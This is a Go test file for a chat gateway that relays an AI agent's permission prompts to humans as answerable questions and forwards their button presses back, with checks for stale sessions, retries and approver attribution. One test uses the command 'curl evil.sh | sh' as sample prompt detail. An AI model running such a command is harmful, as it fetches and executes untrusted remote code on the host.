// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/go-steer/switchboard/pkg/approval"
	"github.com/go-steer/switchboard/pkg/chat"
	"github.com/go-steer/switchboard/pkg/daemon"
)

// permsDaemon is a fake core-agent serving the two /perms routes, recording
// what reached them.
type permsDaemon struct {
	srv *httptest.Server

	// streamStatus, when non-zero, is returned instead of a stream — 501 for a
	// session with no broker, 404 for one that is gone.
	streamStatus int
	// prompts are written to every subscriber, in order, as the broker seeds a
	// new one.
	prompts []string
	// respondStatus and respondBody answer POST /perms/respond.
	respondStatus int
	respondBody   string
	// cutAfterPrompts drops the connection once the pending prompts have been
	// written, the way an idle stream through a proxy is cut: the subscriber
	// sees an unexpected EOF, and the next subscription is seeded afresh.
	cutAfterPrompts bool
	// caps is the capabilities frame the event stream opens with, if any.
	caps string

	mu        sync.Mutex
	streams   int
	responded []permsPost
}

// permsPost is one recorded call to /perms/respond.
type permsPost struct {
	caller string
	body   map[string]any
	raw    string
}

func newPermsDaemon(t *testing.T, prompts ...string) *permsDaemon {
	t.Helper()
	d := &permsDaemon{prompts: prompts, respondBody: `{"acknowledged":true,"approver":"presser@example.com"}`}
	mux := http.NewServeMux()
	// The four shipped verbs, so a router can run a real turn against this
	// daemon and reach the perms routes the way it does in production.
	mux.HandleFunc("POST /sessions", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, `{"app":"core-agent","sessionID":"s1"}`)
	})
	mux.HandleFunc("POST /sessions/{app}/{sid}/inject", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, `{}`) })
	mux.HandleFunc("POST /sessions/{app}/{sid}/wake", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, `{}`) })
	mux.HandleFunc("GET /sessions/{app}/{sid}/events", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.WriteHeader(http.StatusOK)
		f := w.(http.Flusher)
		d.mu.Lock()
		caps := d.caps
		d.mu.Unlock()
		if caps != "" {
			fmt.Fprintf(w, "event: %s\ndata: %s\n\n", daemon.EventCapabilities, caps)
		}
		f.Flush()
		<-r.Context().Done()
	})
	mux.HandleFunc("GET /sessions/{app}/{sid}/perms/stream", func(w http.ResponseWriter, r *http.Request) {
		d.mu.Lock()
		d.streams++
		status, prompts, cut := d.streamStatus, d.prompts, d.cutAfterPrompts
		d.mu.Unlock()
		if status != 0 {
			w.WriteHeader(status)
			return
		}
		w.Header().Set("Content-Type", "text/event-stream")
		w.WriteHeader(http.StatusOK)
		f := w.(http.Flusher)
		for _, p := range prompts {
			fmt.Fprintf(w, "event: prompt\ndata: %s\n\n", p)
		}
		f.Flush()
		if cut {
			// Close the socket rather than return: a handler that returns ends
			// the chunked body properly and the subscriber reads a clean EOF,
			// which is a different case from the stream being severed.
			conn, _, err := w.(http.Hijacker).Hijack()
			if err != nil {
				t.Errorf("hijack: %v", err)
				return
			}
			conn.Close()
			return
		}
		<-r.Context().Done()
	})
	mux.HandleFunc("POST /sessions/{app}/{sid}/perms/respond", func(w http.ResponseWriter, r *http.Request) {
		raw, _ := io.ReadAll(r.Body)
		var body map[string]any
		_ = json.Unmarshal(raw, &body)
		d.mu.Lock()
		d.responded = append(d.responded, permsPost{
			caller: r.Header.Get("X-Asserted-Caller"),
			body:   body,
			raw:    string(raw),
		})
		status, out := d.respondStatus, d.respondBody
		d.mu.Unlock()
		if status != 0 && status != http.StatusOK {
			w.WriteHeader(status)
			return
		}
		fmt.Fprint(w, out)
	})
	d.srv = httptest.NewServer(mux)
	t.Cleanup(d.srv.Close)
	return d
}

func (d *permsDaemon) streamCount() int {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.streams
}

func (d *permsDaemon) posts() []permsPost {
	d.mu.Lock()
	defer d.mu.Unlock()
	return append([]permsPost(nil), d.responded...)
}

// permsRouter wires a router to the fake daemon with permission relaying on,
// and captures its log lines. Backoff is squeezed so a reconnect test does not
// spend the default on waiting.
func permsRouter(t *testing.T, d *permsDaemon) (*Router, *fakeSender, func() []string) {
	t.Helper()
	cfg := daemon.Config{BaseURL: d.srv.URL, BearerToken: "tok", HTTPClient: d.srv.Client()}
	dc, err := daemon.New(cfg)
	if err != nil {
		t.Fatalf("daemon.New: %v", err)
	}
	ac, err := approval.New(cfg)
	if err != nil {
		t.Fatalf("approval.New: %v", err)
	}
	var mu sync.Mutex
	var lines []string
	// Deep enough that a watcher which reposts the same question on every
	// reconnect trips the assertion rather than blocking on a full channel.
	fake := &fakeSender{replies: make(chan chat.Reply, 64)}
	r := NewRouter(dc, fake, ProgressOff, nil, func(f string, v ...any) {
		mu.Lock()
		defer mu.Unlock()
		lines = append(lines, fmt.Sprintf(f, v...))
	})
	r.setApprovals(ac)
	r.minBackoff = time.Millisecond
	r.maxBackoff = 2 * time.Millisecond
	return r, fake, func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), lines...)
	}
}

// testSession is the session every fake daemon here hands back.
var testSession = daemon.Session{App: "core-agent", ID: "s1"}

// ref is the decision id the router puts on a question raised by testSession,
// which is what a press has to carry back.
func ref(promptID string) string { return decisionRef(testSession, promptID) }

// liveEntry registers a ready session for a conversation, as a completed turn
// would have.
func liveEntry(r *Router, conv string) *sessionEntry {
	e := &sessionEntry{ready: make(chan struct{}), sess: testSession}
	close(e.ready)
	r.mu.Lock()
	r.sessions[conv] = e
	r.mu.Unlock()
	return e
}

// capsWith builds a capabilities frame that does or does not offer prompts.
func capsWith(perms bool) daemon.Capabilities {
	return daemon.Capabilities{
		ProtocolVersion: "1",
		Server:          "core-agent",
		Features:        map[string]bool{daemon.FeaturePermsStream: perms},
	}
}

const bashPrompt = `{"id":"pr1","kind":"bash","tool":"bash","detail":"rm -rf /tmp/build","verb":"rm"}`

// ------------------------------------------------------------- the trigger

// A session whose agent registered no broker must not be subscribed to: the
// route 501s, and a watcher per session that will never ask is a connection
// spent on nothing.
func TestNoSubscriptionWhenTheSessionOffersNoPrompts(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, _, _ := permsRouter(t, d)
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(context.Background(), "C1:1", e, capsWith(false))

	time.Sleep(20 * time.Millisecond)
	if n := d.streamCount(); n != 0 {
		t.Errorf("opened %d prompt streams for a session that offers none", n)
	}
}

// The flag is the whole gate. With relaying off, a session that offers prompts
// must still not be subscribed to — anyone who can post in the conversation
// could otherwise answer them.
func TestNoSubscriptionWhenRelayingIsOff(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, _, _ := permsRouter(t, d)
	r.setApprovals(nil)
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(context.Background(), "C1:1", e, capsWith(true))

	time.Sleep(20 * time.Millisecond)
	if n := d.streamCount(); n != 0 {
		t.Errorf("opened %d prompt streams with relaying off", n)
	}
}

// The capabilities frame arrives on every connection, and the event relay
// reconnects. Claiming the watch once is what keeps a flapping relay from
// leaving a watcher behind on each pass — every one of which would post the
// same pending prompt again.
func TestOneWatcherNoMatterHowOftenTheStreamReopens(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	for range 5 {
		r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))
	}

	<-fake.replies // the one prompt, posted once
	time.Sleep(20 * time.Millisecond)
	if n := d.streamCount(); n != 1 {
		t.Errorf("opened %d prompt streams, want 1", n)
	}
	if extra := len(fake.replies); extra != 0 {
		t.Errorf("posted the same pending prompt %d extra times", extra)
	}
}

// A frame that advertises prompts against a session that serves none is
// permanent, not transient. Retrying it is a loop against a route that will
// 501 forever.
func TestASessionThatContradictsItsOwnFrameIsNotRetried(t *testing.T) {
	d := newPermsDaemon(t)
	d.streamStatus = http.StatusNotImplemented
	r, _, logs := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	time.Sleep(50 * time.Millisecond) // many times the 1ms backoff
	if n := d.streamCount(); n != 1 {
		t.Errorf("retried a permanent 501 %d times", n-1)
	}
	if !hasLine(logs(), "serves none") {
		t.Errorf("gave up silently: %v", logs())
	}
}

// A refusal that is not about how the daemon is feeling — a bad token, a
// caller it will not proxy — does not get better on the next attempt. Retrying
// it is a loop that hides the misconfiguration behind a warning every
// millisecond.
func TestAStreamRefusedForGoodIsNotRetried(t *testing.T) {
	d := newPermsDaemon(t)
	d.streamStatus = http.StatusForbidden
	r, _, logs := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	time.Sleep(50 * time.Millisecond) // many times the 1ms backoff
	if n := d.streamCount(); n != 1 {
		t.Errorf("retried a permanent refusal %d times", n-1)
	}
	if !hasLine(logs(), "giving up") {
		t.Errorf("gave up silently: %v", logs())
	}
}

// A stream that drops is a prompt nobody sees. Reconnecting is not optional,
// and it needs no cursor: the broker seeds a new subscriber with everything
// still pending.
func TestADroppedStreamIsReopened(t *testing.T) {
	d := newPermsDaemon(t)
	d.streamStatus = http.StatusBadGateway // transient
	r, _, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if d.streamCount() > 1 {
			return
		}
		time.Sleep(2 * time.Millisecond)
	}
	t.Fatalf("stream was not reopened after a transient failure (%d attempts)", d.streamCount())
}

// Nothing above proves the watcher is ever reached from a real turn — every
// one of those tests calls it directly. This one runs a turn against a daemon
// whose capabilities frame offers prompts and waits for the question to land,
// which is the only assertion that fails if the wiring in noteCapabilities
// goes away.
func TestARealTurnSubscribesOffTheCapabilitiesFrame(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.caps = `{"protocol_version":"1","server":"core-agent","features":{"perms_stream":true}}`
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := r.Handle(ctx, chat.Message{Conversation: "C0:100.1", Caller: "alice@example.com", Text: "hi"}); err != nil {
		t.Fatalf("Handle: %v", err)
	}

	select {
	case reply := <-fake.replies:
		if reply.Kind != chat.KindDecision {
			t.Fatalf("first reply is %q, want the permission question", reply.Kind)
		}
		if reply.Conversation != "C0:100.1" {
			t.Errorf("question landed in %q, not the conversation that asked", reply.Conversation)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("a session offering prompts was never subscribed to")
	}
}

// The same turn against a daemon that offers no prompts must post nothing:
// the frame is the gate, and a session with no broker has no question to ask.
func TestARealTurnWithoutTheFeatureSubscribesToNothing(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.caps = `{"protocol_version":"1","server":"core-agent","event_types":["agent"]}`
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	if err := r.Handle(ctx, chat.Message{Conversation: "C0:100.1", Caller: "alice@example.com", Text: "hi"}); err != nil {
		t.Fatalf("Handle: %v", err)
	}

	select {
	case reply := <-fake.replies:
		t.Fatalf("posted %+v for a session that offers no prompts", reply)
	case <-time.After(100 * time.Millisecond):
	}
	if n := d.streamCount(); n != 0 {
		t.Errorf("opened %d prompt streams", n)
	}
}

// -------------------------------------------------------------- the posting

// The question has to be answerable on the platform it lands on: buttons for
// the adapter, and the same answers in prose for anything that renders none.
func TestAPendingPromptBecomesAnAnswerableQuestion(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	reply := <-fake.replies
	if reply.Kind != chat.KindDecision {
		t.Errorf("kind = %q, want %q", reply.Kind, chat.KindDecision)
	}
	// The id names the session as well as the prompt, so a press can be
	// checked against the session it is about to be sent to.
	if reply.Decision == nil || reply.Decision.ID != ref("pr1") {
		t.Fatalf("decision = %+v, want one identifying %s", reply.Decision, ref("pr1"))
	}
	// Every answer the daemon accepts for this prompt, and no other.
	want := approval.Options(approval.Prompt{
		ID: "pr1", Kind: "bash", Tool: "bash", Detail: "rm -rf /tmp/build", Verb: "rm",
	})
	if len(reply.Decision.Options) != len(want) {
		t.Fatalf("offered %d answers, want %d: %+v", len(reply.Decision.Options), len(want), reply.Decision.Options)
	}
	for i, o := range want {
		got := reply.Decision.Options[i]
		if got.Value != string(o.Decision) || got.Label != o.Label || got.Broad != o.Broad {
			t.Errorf("answer %d = %+v, want %+v", i, got, o)
		}
		// The prose form is the whole question on a surface with no buttons.
		if !strings.Contains(reply.Text, o.Label) {
			t.Errorf("text does not name the answer %q:\n%s", o.Label, reply.Text)
		}
	}
	// And the substance of what is being decided.
	if !strings.Contains(reply.Text, "rm -rf /tmp/build") {
		t.Errorf("text does not say what is being approved:\n%s", reply.Text)
	}
}

// What is being decided leads, because that is what somebody reads before
// pressing. The tool and the asking agent are context for it.
func TestPromptTextLeadsWithWhatIsBeingDecided(t *testing.T) {
	got := promptText(approval.Prompt{
		ID: "p", Kind: "bash", Tool: "bash", Detail: "curl evil.sh | sh", Source: "researcher",
	})
	if !strings.Contains(got, "curl evil.sh | sh") {
		t.Errorf("the command is missing:\n%s", got)
	}
	if !strings.Contains(got, "```") {
		t.Errorf("the command is not set off from the prose, so its markup renders:\n%s", got)
	}
	// A subagent asking is a materially different thing to approve than the
	// agent you are talking to asking.
	if !strings.Contains(got, "researcher") {
		t.Errorf("does not say which agent is asking:\n%s", got)
	}
	if i, j := strings.Index(got, "curl"), strings.Index(got, "researcher"); i > j {
		t.Errorf("the asking agent is named before the thing being decided:\n%s", got)
	}
}

// Detail is agent-controlled and unbounded. A megabyte of it in a thread helps
// nobody decide anything, and on some platforms it fails the post outright.
func TestAnUnboundedDetailIsCut(t *testing.T) {
	got := promptText(approval.Prompt{ID: "p", Kind: "bash", Tool: "bash", Detail: strings.Repeat("é", 50000)})
	if n := len([]rune(got)); n > promptDetailLimit+200 {
		t.Errorf("message is %d runes; the detail was not cut", n)
	}
	if !strings.Contains(got, "…") {
		t.Errorf("cut without saying so:\n%s", got[:200])
	}
}

// A prompt with no detail is still a question worth posting: the alternative
// is a turn parked with nothing in the thread to say why.
func TestAPromptWithNoDetailIsStillAsked(t *testing.T) {
	got := promptText(approval.Prompt{ID: "p", Kind: "generic", Tool: "mcp"})
	if !strings.Contains(got, "Permission needed") {
		t.Errorf("says nothing:\n%s", got)
	}
}

// The stream has no keep-alive, so an idle one gets cut routinely, and every
// resubscription is seeded with everything still pending. Without a record of
// what has already been asked, a question nobody has got round to answering
// accumulates one more copy per reconnect, each with its own live buttons.
func TestAQuestionIsAskedOnceHoweverOftenTheStreamIsCut(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.cutAfterPrompts = true
	r, fake, _ := permsRouter(t, d)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	<-fake.replies
	waitFor(t, func() bool { return d.streamCount() > 5 }, "the stream never reopened")
	if n := fake.sendCount(); n != 1 {
		t.Errorf("the same pending question was posted %d times across %d subscriptions, want 1",
			n, d.streamCount())
	}
}

// A question that never made it into the thread is not "already asked". The
// only retry there is is the next reconnect's seeding, so a transient posting
// failure must not become a question nobody is ever shown.
func TestAQuestionThatFailedToPostIsAskedAgain(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.cutAfterPrompts = true
	r, fake, _ := permsRouter(t, d)
	fake.failNext(1)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))

	select {
	case <-fake.replies:
	case <-time.After(2 * time.Second):
		t.Fatal("a question whose first post failed was never asked again")
	}
}

// A connection that worked resets the backoff, exactly as the event relay's
// does. Doubling unconditionally pins a session whose stream is cut every few
// minutes at the 30s ceiling, and the next permission question then waits half
// a minute before anybody sees it.
func TestAHealthyStreamDoesNotBackOff(t *testing.T) {
	d := newPermsDaemon(t, bashPrompt)
	d.cutAfterPrompts = true
	r, fake, _ := permsRouter(t, d)
	r.minBackoff = time.Millisecond
	r.maxBackoff = 400 * time.Millisecond
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	e := liveEntry(r, "C1:1")

	r.watchPermsIfOffered(ctx, "C1:1", e, capsWith(true))
	<-fake.replies

	// Doubling from 1ms reaches the 400ms ceiling after nine reconnects and
	// manages roughly a dozen in this window; holding at the floor manages
	// hundreds. Twenty separates them with room to spare on a slow machine.
	time.Sleep(300 * time.Millisecond)
	if n := d.streamCount(); n < 20 {
		t.Errorf("reopened %d times in 300ms; a healthy stream is backing off as if it were failing", n)
	}
}

// --------------------------------------------------------------- the press

// The press is answered as the person who made it, in the header the daemon's
// caller middleware reads — and the body carries no approver of its own, which
// core-agent would only ever check and 400 on.
func TestAPressIsAnsweredAsWhoeverPressedIt(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: ref("pr1"), Option: "allow-once",
	})
	if err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	posts := d.posts()
	if len(posts) != 1 {
		t.Fatalf("got %d responses, want 1", len(posts))
	}
	if posts[0].caller != "presser@example.com" {
		t.Errorf("asserted caller = %q, want the presser", posts[0].caller)
	}
	if posts[0].body["decision"] != "allow-once" || posts[0].body["id"] != "pr1" {
		t.Errorf("body = %v, want the pressed answer to pr1", posts[0].body)
	}
	if strings.Contains(posts[0].raw, "approver") {
		t.Errorf("body claims an approver, which can only earn a 400: %s", posts[0].raw)
	}
}

// The record of what has been asked lives as long as the session does, and a
// long-running one raises prompts indefinitely. Bounded means bounded: the
// worst an overflow may cost is a repeated question, never memory that only
// grows.
func TestTheRecordOfAskedQuestionsIsBounded(t *testing.T) {
	e := &sessionEntry{}
	for i := range maxAskedPrompts + 1 {
		if !e.claimAsk(fmt.Sprintf("pr%d", i)) {
			t.Fatalf("pr%d was refused, and it has not been asked", i)
		}
	}
	if n := len(e.asked); n > maxAskedPrompts {
		t.Errorf("the set holds %d prompts, past its own bound of %d", n, maxAskedPrompts)
	}
}

// Buttons outlive the session they were posted for: a bound session the daemon
// has lost is discarded and the next message in the thread opens a new one,
// leaving the old question on screen still pressable. Answering it against
// whatever session the conversation holds now would apply a decision — possibly
// a standing one — to something that never asked for it.
func TestAPressForASessionTheThreadNoLongerHasIsNotAnswered(t *testing.T) {
	d := newPermsDaemon(t)
	r, fake, logs := permsRouter(t, d)
	liveEntry(r, "C1:1") // holds testSession

	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: decisionRef(daemon.Session{App: "core-agent", ID: "gone"}, "pr1"),
		Option:     "allow-always",
	})
	if err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	if posts := d.posts(); len(posts) != 0 {
		t.Fatalf("answered %v against a session that never asked", posts)
	}
	select {
	case got := <-fake.replies:
		if got.Text != noticeStalePress {
			t.Errorf("thread got %q, want the stale-question notice", got.Text)
		}
	default:
		t.Error("nothing was said in the thread: the button flashed and the presser has no way to know the answer went nowhere")
	}
	if !hasLine(logs(), "no longer this conversation's session") {
		t.Errorf("the mismatch was not logged: %v", logs())
	}
}

// Half a decision id is not a decision id. Both halves are load-bearing — the
// session half is what the mismatch check compares — so a reference missing
// either is refused rather than half-applied.
func TestAPressNamingNoPromptIsRefused(t *testing.T) {
	for _, id := range []string{"", "core-agent/s1", "#pr1", "pr1"} {
		d := newPermsDaemon(t)
		r, _, _ := permsRouter(t, d)
		liveEntry(r, "C1:1")

		err := r.HandlePress(context.Background(), chat.Press{
			Conversation: "C1:1", Caller: "presser@example.com",
			DecisionID: id, Option: "allow-once",
		})
		if err == nil {
			t.Errorf("press carrying %q was accepted", id)
		}
		if posts := d.posts(); len(posts) != 0 {
			t.Errorf("press carrying %q answered %v", id, posts)
		}
	}
}

// A press is the one inbound action with no reply of its own. If the answer
// does not reach the daemon and nothing is said, the presser watches an agent
// stay blocked with every appearance of having unblocked it.
func TestAPressThatDidNotReachTheAgentSaysSo(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondStatus = http.StatusBadGateway
	r, fake, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "presser@example.com",
		DecisionID: ref("pr1"), Option: "allow-once",
	})
	if err == nil {
		t.Fatal("HandlePress succeeded on a daemon that refused the answer")
	}
	select {
	case got := <-fake.replies:
		if got.Text != noticePressFailed {
			t.Errorf("thread got %q, want the failed-press notice", got.Text)
		}
		if got.Kind != chat.KindNotice {
			t.Errorf("notice kind = %q, want %q", got.Kind, chat.KindNotice)
		}
	default:
		t.Error("the answer never landed and the thread was not told")
	}
}

// Our own buttons produce our own vocabulary, so anything else is a mangled
// payload. Refusing beats guessing — the nearest wrong guess is an approval.
func TestAPressCarryingSomethingOtherThanADecisionIsRefused(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	for _, option := range []string{"", "yes", "allow", "ALLOW-ONCE"} {
		err := r.HandlePress(context.Background(), chat.Press{
			Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: option,
		})
		if err == nil {
			t.Errorf("press carrying %q was accepted", option)
		}
	}
	if n := len(d.posts()); n != 0 {
		t.Errorf("sent %d answers the daemon never agreed to accept", n)
	}
	// The payload is checked before the session is looked up. Reversing the two
	// reports a mangled press as an expired conversation, which sends whoever
	// reads the log after the wrong thing entirely.
	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:gone", Caller: "u", DecisionID: ref("pr1"), Option: "yes",
	})
	if err == nil {
		t.Fatal("a mangled press was accepted")
	}
	if !strings.Contains(err.Error(), "yes") {
		t.Errorf("error blames something other than the answer that arrived: %v", err)
	}
}

// A press can only ever answer a question posted into a live conversation, so
// a miss means the session went away in between. Reported, never opened: a new
// session has none of the pending prompts the old one did, and the press would
// answer a question that no longer exists.
func TestAPressWithNoLiveSessionOpensNone(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)

	err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:gone", Caller: "u", DecisionID: ref("pr1"), Option: "deny",
	})
	if err == nil {
		t.Fatal("a press against no session was accepted")
	}
	r.mu.Lock()
	n := len(r.sessions)
	r.mu.Unlock()
	if n != 0 {
		t.Errorf("the press created %d sessions", n)
	}
}

// Someone else answered first, or the prompt timed out. Either way the
// question is settled, and reporting it as a failure would put an error in
// the thread for a decision that was already made.
func TestAPromptThatIsNoLongerPendingIsNotAFailure(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondStatus = http.StatusNotFound
	r, _, logs := permsRouter(t, d)
	liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "deny",
	}); err != nil {
		t.Errorf("a settled prompt was reported as a failure: %v", err)
	}
	if !hasLine(logs(), "no longer pending") {
		t.Errorf("settled silently: %v", logs())
	}
}

// The decision applied but the audit line names nobody. That is a real answer,
// not an error — and it is the exact hole an approval trail exists to prevent,
// so it does not pass unremarked.
func TestAnApprovalNobodyIsNamedOnIsRecordedAsSuch(t *testing.T) {
	d := newPermsDaemon(t)
	d.respondBody = `{"acknowledged":true}`
	r, _, logs := permsRouter(t, d)
	liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "allow-once",
	}); err != nil {
		t.Fatalf("HandlePress: %v", err)
	}
	if !hasLine(logs(), "no approver named") {
		t.Errorf("an unattributed approval left no trace: %v", logs())
	}
}

// Platforms redeliver and people click twice. The second press is the same
// answer to the same question, which the daemon settles as already-answered —
// it must not surface as an error either time.
func TestPressingTwiceIsNotAnError(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	liveEntry(r, "C1:1")

	p := chat.Press{Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "deny"}
	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Fatalf("first press: %v", err)
	}
	d.mu.Lock()
	d.respondStatus = http.StatusNotFound // settled by the first
	d.mu.Unlock()
	if err := r.HandlePress(context.Background(), p); err != nil {
		t.Errorf("second press: %v", err)
	}
}

// A gateway with relaying off renders no buttons, so a press against it is
// either a stale message or something else's payload. It is refused rather
// than answered.
func TestAPressAgainstAGatewayWithRelayingOffIsRefused(t *testing.T) {
	d := newPermsDaemon(t)
	r, _, _ := permsRouter(t, d)
	r.setApprovals(nil)
	liveEntry(r, "C1:1")

	if err := r.HandlePress(context.Background(), chat.Press{
		Conversation: "C1:1", Caller: "u", DecisionID: ref("pr1"), Option: "deny",
	}); err == nil {
		t.Error("a press was answered by a gateway that relays no prompts")
	}
	if n := len(d.posts()); n != 0 {
		t.Errorf("sent %d answers anyway", n)
	}
}

func hasLine(lines []string, want string) bool {
	for _, l := range lines {
		if strings.Contains(l, want) {
			return true
		}
	}
	return false
}
